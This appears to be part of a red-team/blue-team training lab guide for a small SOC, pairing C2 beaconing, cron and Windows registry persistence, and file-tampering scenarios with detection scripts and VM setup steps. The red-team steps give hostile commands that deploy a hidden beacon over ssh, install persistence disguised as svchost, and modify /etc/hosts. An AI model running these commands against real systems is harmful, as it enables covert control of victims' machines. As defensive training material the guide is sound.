05 — ATTACK SCENARIOS

4 Simulation Scenarios

Each scenario is a defined round. Red team executes the attack, Blue team must detect and respond within the time limit.

Scenario 1: C2 Beaconing
Red team runs beacon.py. Blue team must detect the pattern within 5 minutes.
⏱ 5 MIN DETECT MITRE: T1071
⚔ RED TEAM ACTIONS
1
Start C2 Server
python3 server.py --port 5000 --log beacons.json
Flask server listens for incoming beacon POST requests
2
Deploy Beacon on Victim
scp beacon.py victim@10.0.0.20:/tmp/.beacon.py && ssh victim "python3 /tmp/.beacon.py &"
Copy beacon to /tmp (hidden) and execute in background
3
Confirm Beacons Received
tail -f beacons.json
Every 30s: {"host":"victim","ip":"10.0.0.20","ts":"..."}
🛡 BLUE TEAM RESPONSE
1
Network Monitor Fires Alert
python3 network_monitor.py --alert-on-beacon --threshold 3
Alerts after 3 identical outbound connections to same IP:port
2
Identify Malicious Process
python3 process_monitor.py --find-by-connection 10.0.0.30:5000
Returns: PID=4821, name=python3, path=/tmp/.beacon.py
3
Kill Process + Block IP
python3 auto_kill.py --pid 4821 && python3 ip_block.py --ip 10.0.0.30
Terminate beacon process and block C2 server IP via iptables
Scenario 2: Persistence
Red team installs persistence via cron job. Blue team must detect and remove it.
⏱ 3 MIN DETECT MITRE: T1053
⚔ RED TEAM ACTIONS
1
Install Cron Persistence
(crontab -l; echo "*/5 * * * * python3 /tmp/.beacon.py") | crontab -
Adds beacon to run every 5 minutes — survives reboot
2
Registry Key (Windows)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v svchost32 /d "python3 C:\temp\beacon.py"
Adds auto-start registry key masquerading as svchost
🛡 BLUE TEAM RESPONSE
1
Cron Change Alert
python3 file_monitor.py --watch /var/spool/cron --alert-new-entries
Watchdog detects crontab modification event
2
Remove Persistence
python3 remove_persistence.py --remove-cron "beacon" --remove-reg-key "svchost32"
Auto-removes both Linux cron entry and Windows registry key
Scenario 3: File Manipulation
Red team drops and modifies files. Blue team must track changes using file integrity monitoring.
⏱ 4 MIN DETECT MITRE: T1105
⚔ RED TEAM ACTIONS
1
Drop Payload Files
python3 file_drop.py --dir /tmp --count 5 --names ".svc,.sys,.dll"
Creates 5 hidden files with suspicious extensions in /tmp
2
Modify System Files
echo "malicious_entry" >> /etc/hosts && touch /etc/cron.d/malicious
Modifies /etc/hosts and creates a fake cron file
🛡 BLUE TEAM RESPONSE
1
FIM Alert — New Files
python3 file_monitor.py --baseline /tmp --watch-etc --alert-hidden
Alerts on new hidden files and /etc directory changes
2
Quarantine Files
python3 quarantine.py --dir /tmp --hidden-only --move /quarantine/
Moves suspicious files to quarantine folder for forensic analysis

06 — IMPLEMENTATION

Setup Guide & Code Structure

Step-by-step guide to get the entire lab running. Start here if you're setting up from scratch.

Install VirtualBox + Create VMs
Create 3 VMs: Kali (attacker), Ubuntu (victim), Ubuntu (blue team monitor). Set all to Host-Only adapter on 10.0.0.0/24 network.
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 10.0.0.1
Install Dependencies
Run on each relevant VM. Red team needs Flask + requests. Blue team needs psutil + scapy + watchdog.
pip3 install flask requests psutil scapy watchdog colorama
Clone / Create Project Structure
Organize code into red_team/ and blue_team/ directories. Keep shared/ for config and logs.
mkdir -p mini_soc/{red_team,blue_team,shared/logs}
Start C2 Server (Red Team)
Run on attacker VM first, then deploy beacon to victim.
cd red_team && python3 c2_server.py --port 5000
Start Monitoring Stack (Blue Team)
All three monitors should run simultaneously in separate terminals.
python3 process_monitor.py &
python3 network_monitor.py &
python3 file_monitor.py &
Launch SOC Dashboard
Open this HTML file in browser on the Blue Team machine, or serve it via Python HTTP server.
python3 -m http.server 8080 --directory .
# Open http://10.0.0.40:8080/dashboard.html
Deploy Beacon (Red Team)
Copy beacon to victim and execute. The simulation begins now — start the stopwatch!
scp beacon.py victim@10.0.0.20:/tmp/.beacon.py
ssh victim "python3 /tmp/.beacon.py &"
Trigger Automated Response
Blue team auto_response.py watches for CRITICAL alerts and fires automatically. Verify it blocks the C2 IP.
python3 auto_response.py --watch alerts.log --auto-block
# Watch: iptables -L OUTPUT | grep DROP
